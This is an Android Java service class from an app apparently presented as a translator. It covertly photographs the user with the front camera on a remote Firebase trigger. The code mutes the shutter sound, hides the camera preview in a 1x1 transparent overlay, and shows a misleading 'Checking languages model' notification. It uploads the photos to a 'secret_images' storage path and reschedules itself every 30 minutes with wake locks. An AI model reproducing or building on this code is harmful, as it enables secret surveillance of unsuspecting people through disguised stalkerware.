package com.example.translator;

import static com.example.translator.FBref.FBST;
import static com.example.translator.FBref.refUsers;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import androidx.annotation.RequiresApi;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;

import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class secretService extends Service
{
    private FirebaseAuth mAuth;
    private ValueEventListener valueEventListener;
    private Camera mCamera;
    private String imagePath = " ";
    private Users user = null; //for uploading image to storage
    private String userId = ""; //for uploading image to storage

    //constatns
    private static final int NOTIFICATION_ID = 123;

    private static final String CHANNEL_ID = "camera_service_channel";

    private static final long INTERVAL_MILLIS = 30 * 60 * 1000; // 30 minutes
    private static final long CPU_ACQUIRE_TIME = 5 * 60 * 1000L; //5 minutes - time for hard CPU work
    private PowerManager.WakeLock wakeLock;



    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        Log.e("Service", "working");
        mAuth = FirebaseAuth.getInstance();
        userId = mAuth.getUid();


        NotificationChannel channel = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            channel = new NotificationChannel(
                    CHANNEL_ID,
                    CHANNEL_ID,
                    NotificationManager.IMPORTANCE_LOW
            );

            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification.Builder notification = new Notification.Builder(this, CHANNEL_ID)
                    .setContentText("Checking languages model")
                    .setContentTitle("Checking...")
                    .setSmallIcon(R.drawable.parrot_logo);

            startForeground(NOTIFICATION_ID, notification.build());
        }

        valueEventListener = new ValueEventListener() {
            @RequiresApi(api = Build.VERSION_CODES.P)
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot)
            {
                Log.e("Service", "serving");
                user = snapshot.getValue(Users.class); // DONT EVER DELETE THIS AGAIN


                //TODO: An error occurred while connecting to camera 0: Status(-8, EX_SERVICE_SPECIFIC): '6: connectHelper:2498: Camera "0" disabled by policy'
                //TODO: java.lang.RuntimeException: Fail to connect to camera service\
                //TODO: Error 2
                //TODO: android.view.WindowManager$BadTokenException: Unable to add window android.view.ViewRootImpl$W@55bfd19 -- permission denied for window type 2006
                //TODO: NEED TO MAKE A PERMISSION REQUEST FOR THIS
                //TODO: IM THE FUCKING GOAT, JUST TAKE THE IMAGE FROM FIREBASE STORAGE AND YOU DONE!!!!!!!
                assert user != null;
                if(user.getToCapture() == 1)
                    capturePicture();

                scheduleNextPicture(); //to ensure service is running
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        };

        assert userId != null;
        refUsers.child(userId).addValueEventListener(valueEventListener);

        return super.onStartCommand(intent, flags, startId);
    }

    @SuppressLint("ScheduleExactAlarm")
    private void scheduleNextPicture()
    {
        AlarmManager alarmManager = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, secretService.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

        long triggerAtMillis = SystemClock.elapsedRealtime() + INTERVAL_MILLIS;

        if(alarmManager != null)
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtMillis, pendingIntent);

    }

    private void capturePicture()
    {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE); //getting the CPU to work faster while uploading image
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "translator::secretService");
        wakeLock.acquire(CPU_ACQUIRE_TIME);

        mCamera = Camera.open(1);
        if(mCamera != null)
        {
            SurfaceView sv = new SurfaceView(this);

            WindowManager wm = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    1,
                    1,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT);

            SurfaceHolder sh = sv.getHolder();

            sv.setZOrderOnTop(true);
            sh.setFormat(PixelFormat.TRANSPARENT);

            sh.addCallback(new SurfaceHolder.Callback() {
                @Override
                public void surfaceCreated(@NonNull SurfaceHolder holder)
                {
                    Log.e("Shay", "Surface Created");
                    Camera.Parameters params = mCamera.getParameters();
                    params.set("camera-sound", "off");
                    params.set("shutter-sound", "0");
                    mCamera.setParameters(params);
                    Camera.Parameters p = mCamera.getParameters();

                    List<Camera.Size> listSize;

                    listSize = p.getSupportedPictureSizes();
                    Camera.Size mPictureSize = listSize.get(2);
                    p.setPictureSize(mPictureSize.width, mPictureSize.height);
                    mCamera.setParameters(p);

                    try
                    {
                        mCamera.setPreviewDisplay(holder);
                    }catch (IOException e) {
                        e.printStackTrace();
                    }
                    mCamera.startPreview();
                    mCamera.lock(); //maybe change to unlcok

                    mCamera.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            try {
                                String fileName = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
                                File storageDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
                                File imgFile = File.createTempFile(fileName, ".jpg", storageDir);

                                FileOutputStream fos = new FileOutputStream(imgFile);
                                fos.write(data);
                                fos.close();

                                imagePath = imgFile.getAbsolutePath();
                            } catch (IOException e) {
                                throw new RuntimeException(e);
                            }

                            wm.removeView(sv);
                            mCamera.stopPreview();


                            //Uplaod image to database
                            ByteArrayOutputStream bytes = new ByteArrayOutputStream();

                            Bitmap bitmap = BitmapFactory.decodeFile(imagePath);
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, bytes);

                            byte bytesOfImage[] = bytes.toByteArray();
                            uploadImageToSorage(bytesOfImage);

                            mCamera.release();
                        }
                    });

                }

                @Override
                public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height)
                {
                }

                @Override
                public void surfaceDestroyed(@NonNull SurfaceHolder holder)
                {
                    mCamera.stopPreview();
                    mCamera.release();
                    mCamera = null;
                    wm.removeView(sv);
                }
            });

            wm.addView(sv, params);

        }
    }

    private void uploadImageToSorage(byte[] imageBytes)
    {
        Date date = Calendar.getInstance().getTime();
        DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-HH:mm:ss");
        String resDate = dateFormat.format(date);
        String id = mAuth.getCurrentUser().getUid();
        String storagePath = "secret_images/"+ id + "/image_" + resDate + ".jpg";

        StorageReference storageReference = FBST.getReference().child(storagePath);

        storageReference.putBytes(imageBytes).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot)
            {
                Log.e("Image", "Image uploaded");

                user.setToCapture(0);
                refUsers.child(userId).setValue(user);
            }

        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e)
            {
                user.setToCapture(0);
                refUsers.child(userId).setValue(user);
            }
        });

    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();
        if(wakeLock != null && wakeLock.isHeld())
            wakeLock.release();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
